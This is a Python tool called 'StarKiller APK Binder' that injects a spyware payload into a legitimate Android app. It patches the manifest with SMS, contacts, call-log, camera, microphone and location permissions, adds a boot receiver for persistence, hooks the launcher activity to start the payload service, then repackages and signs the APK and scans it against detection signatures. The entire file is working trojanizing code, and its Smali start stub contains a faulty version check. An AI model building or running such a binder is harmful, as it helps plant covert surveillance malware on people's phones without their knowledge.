"""
StarKiller APK Binder

Injects StarKiller payload into a legitimate APK:
1. Decompile target APK with apktool → Smali
2. Copy payload Smali classes into decompiled tree
3. Patch AndroidManifest.xml to add permissions + services + boot receiver
4. Inject service start call into target app's main activity
5. Repackage with apktool
6. Sign with uber-apk-signer or jarsigner
"""
import os
import re
import sys
import shutil
import subprocess
import argparse
import xml.etree.ElementTree as ET

TOOLS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools")
APKTOOL = os.path.join(TOOLS_DIR, "apktool.jar")
SIGNER = os.path.join(TOOLS_DIR, "uber-apk-signer.jar")

REQUIRED_PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_PHONE_STATE",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
    "android.permission.WAKE_LOCK",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
]

SMALI_SERVICE_START = """.method private startPayload()V
    .locals 2

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/starkiller/agent/StarKillerService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v1, 0x1a

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    if-lt v1, v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    goto :goto_0

    :cond_0
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_0
    return-void
.end method
"""

SMALI_BOOT_RECEIVER = """.class public Lcom/starkiller/agent/persistence/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v0

    const-string v1, "android.intent.action.BOOT_COMPLETED"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/starkiller/agent/StarKillerService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    return-void
.end method
"""


def run(cmd, cwd=None):
    print(f"    $ {' '.join(cmd[:4])}{'...' if len(cmd) > 4 else ''}")
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd)
    if result.returncode != 0:
        print(f"    [!] Command failed:\n{result.stderr[:500]}")
        return False
    return True


def check_tools():
    missing = []
    if not os.path.exists(APKTOOL):
        missing.append(f"apktool.jar not found at {APKTOOL}")
    if not os.path.exists(SIGNER):
        missing.append(f"uber-apk-signer.jar not found at {SIGNER}")
    if missing:
        print("  [!] Missing tools:")
        for m in missing:
            print(f"      - {m}")
        print("  [*] Run setup or download manually to tools/")
        return False
    return True


def decompile(apk_path, output_dir):
    print(f"  [1/6] Decompiling {os.path.basename(apk_path)}...")
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir)
    return run(["java", "-jar", APKTOOL, "d", apk_path, "-o", output_dir, "-f"])


def inject_payload_smali(decompiled_dir, payload_smali_dir):
    print(f"  [2/6] Injecting payload Smali classes...")
    target_smali = os.path.join(decompiled_dir, "smali")
    if not os.path.exists(target_smali):
        target_smali = os.path.join(decompiled_dir, "smali_classes2")
        os.makedirs(target_smali, exist_ok=True)

    payload_dest = os.path.join(target_smali, "com", "starkiller", "agent")
    if os.path.exists(payload_dest):
        shutil.rmtree(payload_dest)

    if payload_smali_dir and os.path.isdir(payload_smali_dir):
        shutil.copytree(payload_smali_dir, payload_dest)
        count = sum(1 for _, _, files in os.walk(payload_dest) for f in files if f.endswith(".smali"))
        print(f"    [+] Copied {count} Smali files")
    else:
        os.makedirs(payload_dest, exist_ok=True)
        os.makedirs(os.path.join(payload_dest, "persistence"), exist_ok=True)
        os.makedirs(os.path.join(payload_dest, "modules"), exist_ok=True)

        boot_path = os.path.join(payload_dest, "persistence", "BootReceiver.smali")
        with open(boot_path, "w") as f:
            f.write(SMALI_BOOT_RECEIVER)
        print(f"    [+] Wrote boot receiver Smali stub")

    return True


def patch_manifest(decompiled_dir):
    print(f"  [3/6] Patching AndroidManifest.xml...")
    manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")

    with open(manifest_path, "r", encoding="utf-8") as f:
        content = f.read()

    android_ns = "http://schemas.android.com/apk/res/android"

    for perm in REQUIRED_PERMISSIONS:
        if perm not in content:
            perm_line = f'    <uses-permission android:name="{perm}" />\n'
            content = content.replace("<application", perm_line + "    <application", 1)
            print(f"    [+] Added permission: {perm.split('.')[-1]}")

    service_block = f'''
        <service
            android:name="com.starkiller.agent.StarKillerService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <receiver
            android:name="com.starkiller.agent.persistence.BootReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
'''

    if "com.starkiller.agent.StarKillerService" not in content:
        content = content.replace("</application>", service_block + "    </application>")
        print(f"    [+] Injected StarKillerService + BootReceiver into manifest")

    content = content.replace('android:debuggable="true"', 'android:debuggable="false"')

    with open(manifest_path, "w", encoding="utf-8") as f:
        f.write(content)

    return True


def inject_startup_hook(decompiled_dir):
    print(f"  [4/6] Hooking into main activity onCreate...")
    manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    with open(manifest_path, "r") as f:
        content = f.read()

    launcher_match = re.search(
        r'<activity[^>]*android:name="([^"]+)"[^>]*>.*?'
        r'android\.intent\.action\.MAIN.*?android\.intent\.category\.LAUNCHER',
        content, re.DOTALL
    )
    if not launcher_match:
        print(f"    [!] Could not find launcher activity — manual hook needed")
        return True

    main_activity = launcher_match.group(1)
    if main_activity.startswith("."):
        pkg_match = re.search(r'package="([^"]+)"', content)
        if pkg_match:
            main_activity = pkg_match.group(1) + main_activity

    smali_path = main_activity.replace(".", "/") + ".smali"
    for smali_dir in ["smali", "smali_classes2", "smali_classes3"]:
        full_path = os.path.join(decompiled_dir, smali_dir, smali_path)
        if os.path.exists(full_path):
            with open(full_path, "r") as f:
                smali_content = f.read()

            hook_call = "    invoke-direct {p0}, L" + main_activity.replace(".", "/") + ";->startPayload()V\n"

            if "startPayload" not in smali_content:
                smali_content = smali_content.replace(
                    "return-void",
                    hook_call + "\n    return-void",
                    1
                )
                smali_content += "\n" + SMALI_SERVICE_START.replace(
                    "Lcom/starkiller/agent/StarKillerService;",
                    "Lcom/starkiller/agent/StarKillerService;"
                )

                with open(full_path, "w") as f:
                    f.write(smali_content)

                print(f"    [+] Hooked {main_activity} → startPayload()")
            else:
                print(f"    [*] Already hooked")
            return True

    print(f"    [!] Could not find Smali for {main_activity}")
    return True


def repackage(decompiled_dir, output_apk):
    print(f"  [5/6] Repackaging APK...")
    return run(["java", "-jar", APKTOOL, "b", decompiled_dir, "-o", output_apk])


def sign_apk(apk_path):
    print(f"  [6/6] Signing APK...")
    if os.path.exists(SIGNER):
        return run(["java", "-jar", SIGNER, "-a", apk_path, "--overwrite"])
    else:
        ks_path = os.path.join(os.path.dirname(apk_path), "debug.keystore")
        if not os.path.exists(ks_path):
            run(["keytool", "-genkeypair", "-v",
                 "-keystore", ks_path,
                 "-alias", "debug",
                 "-keyalg", "RSA", "-keysize", "2048",
                 "-validity", "10000",
                 "-storepass", "android",
                 "-keypass", "android",
                 "-dname", "CN=Android Debug,O=Android,C=US"])
        return run(["jarsigner", "-verbose",
                    "-sigalg", "SHA256withRSA",
                    "-digestalg", "SHA-256",
                    "-keystore", ks_path,
                    "-storepass", "android",
                    "-keypass", "android",
                    apk_path, "debug"])


def main():
    parser = argparse.ArgumentParser(description="StarKiller APK Binder")
    parser.add_argument("target_apk", help="Legitimate APK to inject into")
    parser.add_argument("--output", "-o", help="Output APK path", default=None)
    parser.add_argument("--payload-smali", help="Directory with pre-compiled payload Smali files")
    parser.add_argument("--skip-sign", action="store_true", help="Skip signing step")
    args = parser.parse_args()

    if not os.path.exists(args.target_apk):
        print(f"  [!] Target APK not found: {args.target_apk}")
        sys.exit(1)

    if not os.path.exists(APKTOOL):
        print(f"  [!] apktool.jar not found at {APKTOOL}")
        print(f"  [*] Download from https://github.com/iBotPeaches/Apktool/releases")
        sys.exit(1)

    base = os.path.splitext(os.path.basename(args.target_apk))[0]
    work_dir = os.path.join("build", f"{base}_decompiled")
    output = args.output or os.path.join("payloads", f"{base}_bound.apk")
    os.makedirs(os.path.dirname(output), exist_ok=True)

    print(f"\n  STARKILLER APK BINDER")
    print(f"  {'='*40}")
    print(f"  target:  {args.target_apk}")
    print(f"  output:  {output}\n")

    if not decompile(args.target_apk, work_dir):
        sys.exit(1)

    if not inject_payload_smali(work_dir, args.payload_smali):
        sys.exit(1)

    if not patch_manifest(work_dir):
        sys.exit(1)

    inject_startup_hook(work_dir)

    if not repackage(work_dir, output):
        sys.exit(1)

    if not args.skip_sign:
        if not sign_apk(output):
            print(f"  [!] Signing failed — APK built but unsigned")

    print(f"\n  [+] DONE: {output}")
    print(f"  [+] Size: {os.path.getsize(output) / 1024:.1f} KB")

    from obfuscate import scan_file_for_signatures, print_scan_report
    findings = scan_file_for_signatures(output)
    if findings:
        print_scan_report({os.path.basename(output): findings}, "BOUND APK DETECTION SCAN")

    print()


if __name__ == "__main__":
    main()
